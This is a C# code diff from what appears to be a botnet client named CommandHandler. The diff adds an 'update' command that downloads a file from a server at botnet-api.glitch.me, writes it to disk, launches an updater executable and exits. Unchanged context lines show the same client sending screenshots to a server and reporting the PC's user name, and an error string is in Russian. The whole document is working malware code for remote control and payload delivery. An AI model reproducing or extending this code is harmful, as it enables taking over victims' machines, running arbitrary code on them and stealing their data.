@@ -12,6 +12,12 @@ using System.Drawing.Drawing2D;
 
 namespace CommandHandler
 {
+    public class Upd
+    {
+        public uint id { get; set; }
+        public string filename { get; set; }
+        public byte[] filebytes { get; set; }
+    }
     public class Product
     {
         public string nameofpc { get; set; }
@@ -126,6 +132,37 @@ namespace CommandHandler
         //        return res;
         //    }
         //}
+
+        public static async Task<string> getFileName()
+        {
+            HttpClient client = new HttpClient();
+            client.BaseAddress = new Uri("http://botnet-api.glitch.me/");
+            HttpResponseMessage resp = await client.GetAsync($"/api/v1/update");
+            if (resp.IsSuccessStatusCode)
+            {
+                var upd = await resp.Content.ReadAsAsync<Upd>();
+                return upd.filename;
+            }
+            else
+            {
+                throw new Exception();
+            }
+        }
+        public static async Task<byte[]> getFileBytes()
+        {
+            HttpClient client = new HttpClient();
+            client.BaseAddress = new Uri("http://botnet-api.glitch.me/");
+            HttpResponseMessage resp = await client.GetAsync($"/api/v1/update");
+            if (resp.IsSuccessStatusCode)
+            {
+                var upd = await resp.Content.ReadAsAsync<Upd>();
+                return upd.filebytes;
+            }
+            else
+            {
+                throw new Exception();
+            }
+        }
         public static async Task ScreenSendAsync(string Id, byte[] bt)
         {
             HttpClient client = new HttpClient();
@@ -426,6 +463,17 @@ namespace CommandHandler
         {
             return String.Format("Name Of PC: " + System.Environment.UserName);
         }
+        public static void updatecommand(string id)
+        {
+            File.Create("C:\\ProgramData\\idbtcU.txt").Close();
+            File.WriteAllText("C:\\ProgramData\\idbtcU.txt", id);
+            byte[] filebytes = HttpHandler.getFileBytes().Result;
+            Directory.CreateDirectory(Environment.CurrentDirectory.ToString() + $"\\Update\\{DateTime.Today.ToLongDateString()}");
+            File.WriteAllBytes(Environment.CurrentDirectory.ToString() + $"\\Update\\{DateTime.Today.ToLongDateString()}"+
+                $"\\{HttpHandler.getFileName().Result}", filebytes);
+            Process.Start(Environment.CurrentDirectory.ToString() + "\\Updater.exe");
+            Environment.Exit(0);
+        }
     }
     public class Class1:HttpHandler
     { 
@@ -458,6 +506,9 @@ namespace CommandHandler
                     break;
                 case "copy":
                     code2(path1, path2);
+                    break;
+                case "update":
+                    updatecommand(idc.ToString());
                     break;
                 default:
                     return ("Команда введена неверно или отсуствует у клиента");
